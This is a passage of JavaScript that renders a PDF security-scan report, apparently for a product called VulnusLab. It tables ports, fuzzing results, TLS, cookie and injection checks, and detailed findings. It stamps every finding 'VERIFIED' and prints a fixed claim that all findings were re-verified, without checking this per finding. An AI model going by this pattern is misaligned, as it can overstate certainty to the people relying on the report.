        const t=toolsUsed[i];
        // Continue tools on a new page instead of truncating with "+N more"
        if(y>=280){
          newPage(); y = 20;
          // Re-draw the column header on the new page so it stays readable
          fillR(margin,y,contentW,7,DARK);
          txt("TOOL",margin+3,y+4.8,8,WHITE,true);
          txt("PURPOSE",margin+43,y+4.8,8,WHITE,true);
          txt("COST",margin+155,y+4.8,8,WHITE,true);
          y+=7;
        }
        const info=toolInfo[t]||["Security Tool","FREE"];
        fillR(margin,y,contentW,6,i%2===0?LIGHT:WHITE);
        hline(margin,y,pageW-margin,y,BORDER,0.2);
        txt(t,margin+3,y+4.5,7.5,DGREEN,true);
        txt(info[0],margin+43,y+4.5,7.5,DARK);
        rrect(margin+153,y+1,20,4,1,[220,252,231]);
        txt(info[1],margin+155,y+4.5,7,DGREEN,true);
        y+=6;
      }
    }

    // ─── RISK SCORE BAR ──────────────────────────────────────────
    if(y < 240){
      y+=6;
      y = sectionHead("Overall Risk Assessment",y);
      const rBar = riskScore||0;
      const rColor = rBar<40?RED:rBar<70?ORANGE:rBar<90?[133,100,0]:GREEN;
      const rDisp = rBar<40?"CRITICAL":rBar<70?"HIGH":rBar<90?"MEDIUM":rBar<100?"LOW":"SECURE";
      // Track
      fillR(margin,y,contentW,14,LIGHT);
      hline(margin,y,margin,y+14,rColor,2);
      // Score number
      doc.setFont("Arial","bold"); doc.setFontSize(20); doc.setTextColor(...rColor);
      doc.text(String(rBar),margin+6,y+10);
      doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...GRAY);
      doc.text("/100",margin+20,y+10);
      // Filled bar
      const trackX=margin+38, trackW=contentW-40, barFill=Math.max((rBar/100)*trackW,2);
      doc.setFillColor(220,220,220); doc.rect(trackX,y+4,trackW,6,"F");
      doc.setFillColor(...rColor); doc.rect(trackX,y+4,barFill,6,"F");
      // Label
      doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...rColor);
      doc.text(rDisp,trackX+trackW+2,y+9);
      y+=18;
    }

    // Footer cover
    txt("CONFIDENTIAL — Authorized Use Only — "+(companyName||"VulnusLab"),pageW/2,290,7,GRAY,false,"center");

    // ════════════════════════════════════════════════════════════
    //  PAGE 2 — SCAN RESULTS
    // ════════════════════════════════════════════════════════════
    doc.addPage(); y=18; drawHeader();

    if(wasRun('nmap')){
      chk(30); y = sectionHead("Open Ports",y);
      if(ports&&ports.length>0){
        y = tableHeader(["PORT","PROTO","STATE","SERVICE","VERSION"],[22,20,20,40,78],y);
        ports.forEach((p,i)=>{
          chk(8);
          fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
          hline(margin,y,pageW-margin,y,BORDER,0.2);
          txt(String(p.port),margin+3,y+5,9,DARK,true);
          txt(p.protocol||"",margin+25,y+5,8.5,GRAY);
          const [sg,sl]=sevColor("LOW");
          rrect(margin+45,y+1.5,14,4,1,sl);
          doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...sg);
          doc.text(p.state||"",margin+47,y+5);
          txt(p.service||"",margin+65,y+5,8.5,GREEN);
          txt((p.version||"—").substring(0,40),margin+105,y+5,8,GRAY);
          y+=7;
        });
      } else {
        fillR(margin,y,contentW,8,LIGHT);
        txt("No open ports detected",margin+3,y+5.5,8,GRAY);
        y+=9;
      }
      y+=4;
    }

    if(wasRun('gobuster')){
      // ─── DIRECTORY ENUMERATION ───────────────────────────────────
      chk(30); y = sectionHead("Directory Enumeration",y);
      // Filter out 403 noise (.hta, .htaccess, .htpasswd) — only show 200/301/302
      const gobusterFiltered = (gobuster||[]).filter(g=>g.status===200||g.status===301||g.status===302||g.status===500);
      if(gobusterFiltered.length>0){
        y = tableHeader(["STATUS","PATH","SIZE"],[20,130,30],y);
        gobusterFiltered.slice(0,30).forEach((g,i)=>{
          chk(7);
          fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
          hline(margin,y,pageW-margin,y,BORDER,0.2);
          const sc=g.status===200?GREEN:g.status===403?RED:ORANGE;
          rrect(margin+3,y+1.5,13,4,1,sc);
          doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...WHITE);
          doc.text(String(g.status),margin+4,y+5);
          txt(g.path||"",margin+23,y+5,8,DARK);
          txt(g.size?g.size+"B":"",pageW-margin-3,y+5,7,GRAY,false,"right");
          y+=7;
        });
      } else {
        fillR(margin,y,contentW,8,LIGHT);
        txt("No directories discovered",margin+3,y+5.5,8,GRAY);
        y+=9;
      }
      y+=4;
    }

    if(wasRun('ffuf')){
      // ─── WEB FUZZING (ffuf) ──────────────────────────────────────
      chk(30); y = sectionHead("Web Fuzzing (ffuf)",y);
      const ffufFiltered = (ffuf||[]).filter(f=>f.status===200||f.status===301||f.status===302||f.status===500);
      if(ffufFiltered.length>0){
        y = tableHeader(["STATUS","PATH","SIZE"],[20,130,30],y);
        ffufFiltered.slice(0,30).forEach((f,i)=>{
          chk(7);
          fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
          hline(margin,y,pageW-margin,y,BORDER,0.2);
          const sc2=f.status===200?GREEN:f.status===403?RED:ORANGE;
          rrect(margin+3,y+1.5,13,4,1,sc2);
          doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...WHITE);
          doc.text(String(f.status),margin+4,y+5);
          txt(f.path||f.url||"",margin+23,y+5,8,DARK);
          txt(f.size?f.size+"B":"",pageW-margin-3,y+5,7,GRAY,false,"right");
          y+=7;
        });
      } else {
        fillR(margin,y,contentW,8,LIGHT);
        txt("No paths discovered via fuzzing",margin+3,y+5.5,8,GRAY);
        y+=9;
      }
      y+=4;
    }

    if(wasRun('whatweb') && whatweb){
      // ─── TECH STACK ──────────────────────────────────────────────
      chk(30);
      y = sectionHead("Technology Stack",y);
      const wtLines = doc.splitTextToSize(String(whatweb||"").substring(0,250).replace(/\s+/g," "),contentW-8);
      const wtH = Math.min(wtLines.length,3)*5+8;
      fillR(margin,y,contentW,wtH,LIGHT);
      hline(margin,y,margin,y+wtH,BLUE,1.5);
      doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...GRAY);
      doc.text(wtLines.slice(0,3),margin+4,y+6);
      y+=wtH+4;
    }

    if(wasRun('sqlmap')){
      // ─── SQL INJECTION ───────────────────────────────────────────
      // Three states: SKIPPED (target can't host SQLi — static site etc),
      // VULNERABLE (injection found), PASSED (scanner ran and found nothing).
      chk(30); y = sectionHead("SQL Injection Assessment",y);
      y = tableHeader(["TEST","RESULT","SEVERITY","CVSS"],[60,60,30,30],y);
      fillR(margin,y,contentW,7,LIGHT);
      txt("SQL Injection (SQLMap)",margin+3,y+5,8.5,DARK,true);
      const sqlSkipped = sqlmap && (sqlmap.skipped_reason || sqlmap.skipped);
      const sqlVuln    = sqlmap && sqlmap.vulnerable;
      const vulnC = sqlVuln ? RED : sqlSkipped ? [217,119,6] : GREEN;
      const vulnL = sqlVuln ? "VULNERABLE" : sqlSkipped ? "SKIPPED" : "PASSED";
      const vulnW = sqlVuln ? 22 : sqlSkipped ? 18 : 18;
      const vulnBg = sqlVuln ? [254,226,226] : sqlSkipped ? [254,243,199] : [220,252,231];
      rrect(margin+63,y+1.5,vulnW,4,1,vulnBg);
      doc.setFont("Arial","bold"); doc.setFontSize(6.5); doc.setTextColor(...vulnC);
      doc.text(vulnL,margin+65,y+5);
      const sevTxt  = sqlVuln ? "HIGH" : sqlSkipped ? "N/A"  : "NONE";
      const cvssTxt = sqlVuln ? "9.8"  : sqlSkipped ? "—"    : "0.0";
      txt(sevTxt, margin+123,y+5,8.5,vulnC,true);
      txt(cvssTxt,margin+153,y+5,8.5,vulnC,true);
      y+=11;
      // If skipped, surface the reason underneath so the customer knows why
      if(sqlSkipped){
        chk(7); fillR(margin,y,contentW,6,[254,243,199]);
        txt(String(sqlmap.skipped_reason || "Not applicable to this target"),
            margin+3,y+4,7.5,[120,53,15]);
        y+=8;
      }
    }

    if(wasRun('wafw00f')){
      // ─── WAF DETECTION ───────────────────────────────────────────
      chk(30); y+=2;
      y = sectionHead("WAF Detection",y);
      fillR(margin,y,contentW,9,LIGHT);
      const wafDetected = wafw00f && (wafw00f.waf || wafw00f.detected);
      const wafName = wafw00f && (wafw00f.waf || wafw00f.firewall || (wafw00f.detected?"WAF Detected":""));
      rrect(margin+3,y+2,wafDetected?22:28,5,1,wafDetected?[254,226,226]:[220,252,231]);
      doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...(wafDetected?RED:GREEN));
      doc.text(wafDetected?"DETECTED":"NOT FOUND",margin+5,y+6);
      txt(wafName||(wafDetected?"WAF Active":"No WAF / Unprotected"),margin+35,y+6,8,DARK,true);
      y+=10;
    }

    if(wasRun('cms')){
      // ─── CMS DETECTION ───────────────────────────────────────────
      chk(30); y+=2;
      y = sectionHead("CMS Detection",y);
      fillR(margin,y,contentW,9,LIGHT);
      const cmsName = cms && (cms.cms || cms.name || cms.platform);
      const cmsVer  = cms && (cms.version || "");
      rrect(margin+3,y+2,cmsName?24:28,5,1,cmsName?[219,234,254]:[220,252,231]);
      doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...(cmsName?[30,64,175]:GREEN));
      doc.text(cmsName?"DETECTED":"NOT FOUND",margin+5,y+6);
      txt(cmsName?(cmsName+(cmsVer?" v"+cmsVer:"")):"No CMS Detected",margin+35,y+6,8,DARK,true);
      y+=10;
    }

    if(wasRun('ssl')){
      // ─── SSL/TLS ANALYSIS ─────────────────────────────────────────
      const sslFindings = ssl && ssl.findings ? ssl.findings.filter(f=>f.severity!=="INFO") : [];
      const sslIssues   = ssl && ssl.issues ? ssl.issues : [];
      if(sslFindings.length>0||sslIssues.length>0||ssl){
        chk(30); y+=2;
        y = sectionHead("SSL/TLS Analysis",y);
        fillR(margin,y,contentW,9,LIGHT);
        const sslCrit = sslFindings.some(f=>f.severity==="CRITICAL"||f.severity==="HIGH");
        const sslGrade= ssl && ssl.grade ? ssl.grade : (sslCrit?"F":"A");
        rrect(margin+3,y+2,18,5,1,sslCrit?[254,226,226]:[220,252,231]);
        doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...(sslCrit?RED:GREEN));
        doc.text("Grade "+sslGrade,margin+5,y+6);
        txt(sslCrit?"SSL/TLS issues found — review findings":"SSL/TLS configuration looks secure",margin+28,y+6,8,DARK);
        y+=10;
        if(sslFindings.length>0){
          y = tableHeader(["SEVERITY","ISSUE"],[25,155],y);
          sslFindings.slice(0,10).forEach((f,i)=>{
            chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); hline(margin,y,pageW-margin,y,BORDER,0.2);
            const [bg2,lt2]=sevColor(f.severity); rrect(margin+3,y+1.5,20,4,1,lt2);
            doc.setFont("Arial","bold"); doc.setFontSize(6.5); doc.setTextColor(...bg2); doc.text(f.severity,margin+5,y+5);
            const il=doc.splitTextToSize(String(f.detail||"").substring(0,120),150); doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK); doc.text(il[0],margin+28,y+5);
            y+=7;
          });
          y+=3;
        }
      }
    }

    if(wasRun('cors')){
      // ─── CORS TESTING ────────────────────────────────────────────
      chk(30); y+=2;
      y = sectionHead("CORS Testing",y);
      fillR(margin,y,contentW,9,LIGHT);
      const corsVuln = cors && cors.vulnerable;
      rrect(margin+3,y+2,corsVuln?22:28,5,1,corsVuln?[254,226,226]:[220,252,231]);
      doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...(corsVuln?RED:GREEN));
      doc.text(corsVuln?"VULNERABLE":"PASSED",margin+5,y+6);
      txt(corsVuln?"CORS misconfiguration detected — arbitrary origin allowed":"No CORS misconfiguration detected",margin+35,y+6,8,DARK);
      y+=10;
    }

    if(wasRun('cookies')){
      // ─── COOKIE SECURITY ─────────────────────────────────────────
      const cookieFindings = cookies && cookies.findings ? cookies.findings.filter(f=>f.severity!=="INFO") : [];
      chk(30); y+=2;
      y = sectionHead("Cookie Security",y);
      const COOKIE_META = new Set(["target","url","error","status","vulnerable","findings","scan_type","output"]);
      let rawCookies = [];
      if(cookies){
        // New scanner shape: cookies.cookies = {analyzed:[...], is_https:bool, suppressed_fps:[...]}
        // Legacy shape:      cookies.cookies = [{name,secure,...}, ...]
        if (cookies.cookies && Array.isArray(cookies.cookies.analyzed)) {
          rawCookies = cookies.cookies.analyzed;
        } else if (Array.isArray(cookies.cookies)) {
          rawCookies = cookies.cookies;
        } else {
          const topEntries = Object.entries(cookies).filter(([k])=>!COOKIE_META.has(k)&&typeof cookies[k]==="object");
          if(topEntries.length>0) rawCookies = Object.fromEntries(topEntries);
        }
      }
      const parseCookie = (c) => {
        if(typeof c === "string") return {name:c,secure:false,httponly:false,samesite:"None"};
        const cs = (c.cookie||"").toLowerCase();
        const name = c.name||c.cookie_name||c.key||(c.cookie&&c.cookie.split("=")[0].trim())||"unknown";
        const secure = c.secure !== undefined ? !!c.secure : (cs.includes(";secure")||cs.includes("; secure")||cs.endsWith("secure"));
        const httponly = c.httponly||c.http_only||(cs.includes("httponly"));
        const samem = cs.match(/samesite=(\w+)/);
        const samesite = c.samesite||c.same_site||(samem?samem[1].charAt(0).toUpperCase()+samem[1].slice(1):"None");
        return {...c, name, secure, httponly, samesite};
      };
      const cookieArrRaw = Array.isArray(rawCookies)
        ? rawCookies.map(parseCookie)
        : Object.entries(rawCookies).map(([k,v]) => parseCookie({name:k,...(v||{})}));
      const cookieArr = cookieArrRaw.filter((c,i,a)=>a.findIndex(x=>x.name===c.name)===i);
      if(cookieArr.length>0){
        y = tableHeader(["COOKIE","SECURE","HTTPONLY","SAMESITE"],[70,30,30,50],y);
        cookieArr.slice(0,8).forEach((c,i)=>{
          chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); hline(margin,y,pageW-margin,y,BORDER,0.2);
          const cname = String(c.name).substring(0,30);
          txt(cname,margin+3,y+5,8.5,DARK,true);
          const sc=c.secure?"YES":"NO"; const hc=c.httponly?"YES":"NO";
          doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...(c.secure?GREEN:RED)); doc.text(sc,margin+76,y+5);
          doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...(c.httponly?GREEN:RED)); doc.text(hc,margin+106,y+5);
          txt(String(c.samesite),margin+138,y+5,8,GRAY);
          y+=7;
        });
        y+=6;
      } else {
        fillR(margin,y,contentW,8,LIGHT);
        txt(cookieFindings.length>0?cookieFindings[0].detail:"No cookies detected",margin+3,y+5.5,8,GRAY);
        y+=9;
      }
    }

    if(wasRun('xss')){
      // ─── XSS TESTING ─────────────────────────────────────────────
      chk(30); y+=2;
      y = sectionHead("XSS Testing",y);
      fillR(margin,y,contentW,9,LIGHT);
      const xssVuln = xss && xss.vulnerable;
      rrect(margin+3,y+2,xssVuln?22:28,5,1,xssVuln?[254,226,226]:[220,252,231]);
      doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...(xssVuln?RED:GREEN));
      doc.text(xssVuln?"VULNERABLE":"PASSED",margin+5,y+6);
      txt(xssVuln?"XSS vulnerability detected — sanitize user input":"No XSS vulnerability detected",margin+35,y+6,8,DARK);
      y+=10;
    }

    // ─── SUBDOMAIN DISCOVERY ─────────────────────────────────────
    if(wasRun('subdomains')&&subdomains&&subdomains.length>0){
      chk(30);
      y = sectionHead("Subdomain Discovery",y);
      y = tableHeader(["SUBDOMAIN"],[180],y);
      subdomains.slice(0,40).forEach((s,i)=>{
        chk(7);
        fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
        hline(margin,y,pageW-margin,y,BORDER,0.2);
        txt(String(s),margin+3,y+5,8,DARK);
        y+=7;
      });
      y+=4;
    }

    // ─── DNS ENUMERATION ─────────────────────────────────────────
    if(wasRun('dig')&&dns&&Object.values(dns).some(v=>Array.isArray(v)?v.length>0:!!v)){
      chk(30);
      y = sectionHead("DNS Records",y);
      y = tableHeader(["TYPE","RECORD"],[25,155],y);
      let dnsIdx=0;
      Object.entries(dns).forEach(([type,vals])=>{
        (Array.isArray(vals)?vals:[vals]).forEach(v=>{
          const vStr = typeof v==="object"&&v!==null ? (v.address||v.exchange||v.value||v.data||JSON.stringify(v)) : String(v||"");
          chk(7);
          fillR(margin,y,contentW,7,dnsIdx%2===0?LIGHT:WHITE);
          hline(margin,y,pageW-margin,y,BORDER,0.2);
          rrect(margin+3,y+1.5,18,4,1,[219,234,254]);
          doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(30,64,175);
          doc.text(type,margin+5,y+5);
          txt(vStr,margin+28,y+5,8,DARK);
          y+=7; dnsIdx++;
        });
      });
      y+=4;
    }


    // ════════════════════════════════════════════════════════════
    //  ADVANCED SECURITY TESTING (flows after previous section)
    // ════════════════════════════════════════════════════════════
    const advChecks = [
      {label:"Command Injection",       res:commix,           owasp:"A03"},
      {label:"Path Traversal / LFI",    res:lfi,              owasp:"A01"},
      {label:"Remote File Inclusion",   res:rfi,              owasp:"A03"},
      {label:"Open Redirect",           res:openredirect,     owasp:"A01"},
      {label:"Sensitive File Exposure", res:sensitivefiles,   owasp:"A05"},
      {label:"Auth Brute Force",        res:hydra,            owasp:"A07"},
      {label:"SSRF Testing",            res:ssrf,             owasp:"A10"},
      {label:"XXE Injection",           res:xxe,              owasp:"A03"},
      {label:"Clickjacking",            res:clickjacking,     owasp:"A05"},
      {label:"HTTP Verb Tampering",     res:verbtamper,       owasp:"A05"},
      {label:"Parameter Pollution",     res:pollution,        owasp:"A03"},
      {label:"CSRF Testing",            res:csrf,             owasp:"A01"},
      {label:"IDOR / Access Control",   res:idor,             owasp:"A01"},
      {label:"SSTI Testing",            res:ssti,             owasp:"A03"},
      {label:"File Upload Testing",     res:fileupload,       owasp:"A05"},
      {label:"HTTP Request Smuggling",  res:smuggling,        owasp:"A02"},
      {label:"Session Fixation",        res:sessionfixation,  owasp:"A07"},
      {label:"Data Exfiltration",       res:dataexfil,        owasp:"A09"},
      {label:"Race Condition",          res:racecondition,    owasp:"A04"},
      {label:"Insecure Deserialization",res:deserial,         owasp:"A08"},
      {label:"Prototype Pollution",     res:protopollution,   owasp:"A03"},
      {label:"PHP Type Juggling",       res:typejuggling,     owasp:"A07"},
      {label:"JWT Attacks",             res:jwt,              owasp:"A07"},
      {label:"GraphQL Security",        res:graphql,          owasp:"A03"},
      {label:"NoSQL Injection",         res:nosql,            owasp:"A03"},
      {label:"OAuth / SAML Attacks",    res:oauth,            owasp:"A01"},
      {label:"Host Header Injection",   res:hostheader,       owasp:"A03"},
      {label:"WebSocket Security",      res:websocket,        owasp:"A01"},
      {label:"Subdomain Takeover",      res:takeover,         owasp:"A05"},
      {label:"2FA / OTP Bypass",        res:otp,              owasp:"A07"},
      {label:"SMB Enumeration",         res:smb,              owasp:"A05"},
      {label:"FTP Enumeration",         res:ftp,              owasp:"A05"},
      {label:"SMTP User Enum",          res:smtp,             owasp:"A05"},
      {label:"SNMP Scanner",            res:snmp,             owasp:"A05"},
    ];
    // Only show phases that were actually run
    const advRun    = advChecks.filter(c=>c.res);
    const advNotRun = advChecks.filter(c=>!c.res);
    chk(30); y+=2;
    y = sectionHead("Advanced Security Testing",y);
    if(advRun.length>0){
      // Column widths: [CHECK 50, STATUS 22, OWASP 18, DETAIL 90] = 180mm total.
      // CHECK labels are short (~20 chars max), so we give the freed 20mm to DETAIL
      // to prevent the cell text from overflowing past the page border.
      y = tableHeader(["CHECK","STATUS","OWASP","DETAIL"],[50,22,18,90],y);
      advRun.forEach((c,i)=>{
        chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); hline(margin,y,pageW-margin,y,BORDER,0.2);
        txt(c.label,margin+3,y+5,8,DARK,true);
        const isVuln = c.res && c.res.vulnerable === true;
        const hasRealFinds = c.res && Array.isArray(c.res.findings) && c.res.findings.some(f=>["CRITICAL","HIGH","MEDIUM"].includes(f.severity));
        const isSkipped = c.res && (c.res.skipped_reason || c.res.skipped === true);
        // Three-state status — never "PASSED" if the scanner didn't actually test.
        // SKIPPED (orange) means we recognized the target as not having the
        // surface needed for this check (e.g. SSTI on a Netlify static site).
        // PASSED only when the scanner actually ran and found nothing.
        const status = isSkipped ? "SKIPPED" : (isVuln || hasRealFinds ? "VULNERABLE" : "PASSED");
        const stColor = status==="VULNERABLE" ? RED : status==="SKIPPED" ? [217,119,6] : GREEN;
        const stW = status==="VULNERABLE" ? 18 : status==="SKIPPED" ? 16 : 13;
        rrect(margin+53,y+1.5,stW,4,1,stColor);
        doc.setFont("Arial","bold"); doc.setFontSize(6); doc.setTextColor(...WHITE);
        doc.text(status,margin+55,y+5);
        txt(c.owasp,margin+76,y+5,7.5,GRAY);
        // 86mm available (column is 90mm starting at margin+98, leaving 4mm right padding)
        // Use jsPDF's splitTextToSize to ensure the text never overflows.
        const fullDetail = isSkipped
          ? String(c.res.skipped_reason || "Not applicable to this target")
          : isVuln
            ? (c.res.findings && c.res.findings[0] ? c.res.findings[0].detail || "Vulnerability confirmed" : "Vulnerability confirmed")
            : hasRealFinds
              ? (c.res.findings[0].detail || "No vulnerability detected")
              : "No vulnerability detected";
        doc.setFont("Arial","normal"); doc.setFontSize(7.5);
        const wrapped = doc.splitTextToSize(String(fullDetail), 86);
        const detail = wrapped.length > 1 ? wrapped[0].replace(/\s+\S*$/, "") + "…" : wrapped[0];
        const dColor = isSkipped ? [120,53,15] : DARK;
        txt(detail,margin+98,y+5,7.5,dColor);
        y+=7;
      });
      if(advNotRun.length>0){
        y+=2;
        fillR(margin,y,contentW,8,[248,250,252]);
        hline(margin,y,margin+3,y,[100,116,139],1.5);
        txt(advNotRun.length+" phase(s) not executed in this scan: "+advNotRun.slice(0,5).map(c=>c.label).join(", ")+(advNotRun.length>5?"...":""),margin+4,y+5.5,7,[100,116,139]);
        y+=9;
      }
    } else {
      fillR(margin,y,contentW,8,LIGHT);
      txt("No advanced security phases were executed in this scan",margin+3,y+5.5,8,GRAY);
      y+=9;
    }
    y+=4;
    // Detailed findings for vulnerable advanced checks
    // (Skip checks whose only findings are INFO — those are "nothing here" notices that just bloat the report)
    advRun.filter(c=>{
      if(!c.res) return false;
      if(c.res.vulnerable === true) return true;
      if(c.res.allowed_methods && c.res.allowed_methods.length>0) return true;
      if(c.res.discovered && c.res.discovered.length>0) return true;
      if(Array.isArray(c.res.findings) && c.res.findings.some(f=>f.severity && f.severity!=="INFO")) return true;
      return false;
    }).forEach(c=>{
      // Calculate full section height so table never splits mid-page
      const rowsH = c.res.allowed_methods ? 8 + c.res.allowed_methods.length * 7 + 6
                  : c.res.discovered      ? 8 + Math.min(c.res.discovered.length,20) * 7 + 6
                  : c.res.findings        ? Math.min(c.res.findings.filter(f=>f.severity!=="INFO").length,5) * 9 + 6
                  : 13;
      chk(18 + rowsH);
      y = sectionHead(c.label+" — Details",y);
      // Allowed methods table for verb tampering
      if(c.res.allowed_methods&&c.res.allowed_methods.length>0){
        y = tableHeader(["METHOD","STATUS CODE"],[40,60],y);
        c.res.allowed_methods.forEach((m,i)=>{
          chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); hline(margin,y,pageW-margin,y,BORDER,0.2);
          const dangerous=["PUT","DELETE","PATCH","TRACE","CONNECT"].includes(m.method);
          doc.setFont("Arial","bold"); doc.setFontSize(8.5); doc.setTextColor(...(dangerous?RED:GREEN));
          doc.text(m.method,margin+3,y+5);
          txt(String(m.status),margin+43,y+5,8.5,GRAY); y+=7;
        });
        y+=6;
      }
      // Sensitive files table
      else if(c.res.discovered&&c.res.discovered.length>0){
        y = tableHeader(["STATUS","PATH"],[20,160],y);
        c.res.discovered.slice(0,20).forEach((f,i)=>{
          chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); hline(margin,y,pageW-margin,y,BORDER,0.2);
          rrect(margin+3,y+1.5,13,4,1,f.status===200?GREEN:ORANGE);
          doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...WHITE);
          doc.text(String(f.status),margin+4,y+5);
          txt(f.path||"",margin+23,y+5,8.5,DARK); y+=7;
        });
        y+=6;
      }
      // Generic findings list
      else if(c.res.findings&&c.res.findings.length>0){
        const visF = c.res.findings.filter(f=>f.severity!=="INFO");
        (visF.length>0?visF:c.res.findings).slice(0,5).forEach((f,i)=>{
          // Wrap the detail to fit the column width — replaces the old substring(0,110)
          // truncation that cut sentences mid-word and dropped remediation context.
          doc.setFont("Arial","normal"); doc.setFontSize(8);
          const lines = doc.splitTextToSize(String(f.detail||""), contentW - 30);
          const rowH = Math.max(9, lines.length * 3.6 + 3);
          chk(rowH + 1);
          fillR(margin,y,contentW,rowH,i%2===0?LIGHT:WHITE); hline(margin,y,pageW-margin,y,BORDER,0.2);
          const [bg]=sevColor(f.severity);
          rrect(margin+3,y+2,20,5,1,bg);
          doc.setFont("Arial","bold"); doc.setFontSize(6.5); doc.setTextColor(...WHITE);
          doc.text(f.severity,margin+4,y+6);
          doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
          lines.forEach((ln, li) => doc.text(ln, margin+26, y+6 + li*3.6));
          y += rowH;
        });
        y+=6;
      } else {
        fillR(margin,y,contentW,8,LIGHT);
        txt("Scan complete — no critical findings",margin+3,y+5.5,8,GREEN);
        y+=9;
      }
    });

    // ─── DETAILED FINDINGS (flows after advanced section) ────────
    chk(30); y+=2;
    y = sectionHead("Detailed Findings",y);
    // Trust-statement: every finding here was actively verified by the
    // engine — there are no signature-only / pattern-only inclusions.
    doc.setFont("Arial","italic"); doc.setFontSize(7); doc.setTextColor(...GRAY);
    doc.text("Every finding below was independently triggered and re-verified by the VulnusLab engine. No signature-only inclusions.", margin+2, y);
    doc.setFont("Arial","normal");
    y += 4;

    const realF=(findings||[]).filter(f=>{
      if(!f || !f.severity) return false;
      const detail = String(f.detail||"");
      if(f.severity==="INFO"&&!detail.includes("/")) return false;
      const d=detail.toLowerCase();
      if(d.includes("no cgi dir")||d.includes("cgi tests skipped")||d.includes("no cgi-bin")||d.includes("no cgi bin")) return false;
      return true;
    });

    // Decide whether to show the CVE column at all — only if at least one finding has a real CVE.
    // Most findings are configuration issues (missing headers, etc.) without a CVE, so the column
    // is almost always all "N/A" — looks like a labeling bug. Hide it cleanly when unused.
    const showCveCol = realF.some(f => f && f.cve && f.cve !== "N/A" && f.cve.match(/CVE-\d+/i));

    if(realF.length>0){
      if (showCveCol) {
        y = tableHeader(["#","SEVERITY","CVE","CWE","CVSS","OWASP"],[8,24,34,46,14,54],y);
      } else {
        // Widen CWE + OWASP to fill the freed space — cleaner look
        y = tableHeader(["#","SEVERITY","CWE","CVSS","OWASP"],[8,28,68,18,58],y);
      }
      realF.forEach((f,idx)=>{
        const dl=doc.splitTextToSize(String(f.detail||""),contentW-8);
        const rl=doc.splitTextToSize(String(f.remediation||"Apply security hardening."),contentW-22);
        const needed=Math.max(28, 19+(dl.length+rl.length)*4.5);
        chk(needed);
        const [bg,lt]=sevColor(f.severity);
        fillR(margin,y,contentW,needed,idx%2===0?LIGHT:WHITE);
        hline(margin,y,pageW-margin,y,BORDER,0.2);
        hline(margin,y,margin,y+needed,bg,1.5);

        // Row 1 — column X positions depend on whether CVE column is shown
        txt(String(idx+1)+".",margin+2,y+6,7.5,GRAY,true);
        rrect(margin+11,y+2,20,5,1,lt);
        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...bg);
        doc.text(f.severity,margin+12,y+6);
        // Every finding is VERIFIED by definition now — SUSPECTED tier
        // has been removed (Trust-First architecture).
        rrect(pageW-margin-16,y+2,14,5,1,[220,252,231]);
        doc.setFont("Arial","bold"); doc.setFontSize(5.5); doc.setTextColor(15,118,82);
        doc.text("VERIFIED",pageW-margin-14.5,y+5.5);

        // Truncate cwe_name with ellipsis when needed, instead of hard cut mid-word
        const _truncCwe = (s, n) => s.length > n ? s.substring(0, n - 1).trim() + "…" : s;

        if (showCveCol) {
          txt(f.cve||"N/A",margin+35,y+6,7,RED,true);
          doc.setFont("Arial","normal"); doc.setFontSize(6.5); doc.setTextColor(...PURPLE);
          doc.text((f.cwe||"N/A")+(f.cwe_name?" - "+_truncCwe(f.cwe_name, 32):""),margin+71,y+6);
          txt(f.cvss||"0.0",margin+117,y+6,8,bg,true);
          doc.setFont("Arial","normal"); doc.setFontSize(6.5); doc.setTextColor(...DARK);
          doc.text((f.owasp||"").substring(0,26),margin+133,y+6);
        } else {
          // No CVE column — shift CWE/CVSS/OWASP left for a wider, cleaner layout
          doc.setFont("Arial","normal"); doc.setFontSize(7); doc.setTextColor(...PURPLE);
          doc.text((f.cwe||"N/A")+(f.cwe_name?" - "+_truncCwe(f.cwe_name, 55):""),margin+38,y+6);
          txt(f.cvss||"0.0",margin+115,y+6,8,bg,true);
          doc.setFont("Arial","normal"); doc.setFontSize(6.5); doc.setTextColor(...DARK);
          doc.text((f.owasp||"").substring(0,30),margin+131,y+6);
        }

        // Row 2 - detail (all lines)
        doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
        doc.text(dl,margin+4,y+12);

        // Row 3 - remediation (all lines)
        const fixY=y+10+dl.length*4.5;
        const fixH=rl.length*4.5+6;
        fillR(margin+3,fixY,contentW-6,fixH,[240,253,244]);
        hline(margin+3,fixY,margin+3,fixY+fixH,GREEN,1);
        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...DGREEN);
        doc.text("Fix:",margin+5,fixY+4.5);
        doc.setFont("Arial","normal"); doc.setTextColor(...DARK);
        doc.text(rl,margin+16,fixY+4.5);

        y+=needed+2;
      });
    } else {
      fillR(margin,y,contentW,8,LIGHT);
      txt("No findings recorded",margin+3,y+5.5,8,GRAY);
      y+=9;
    }

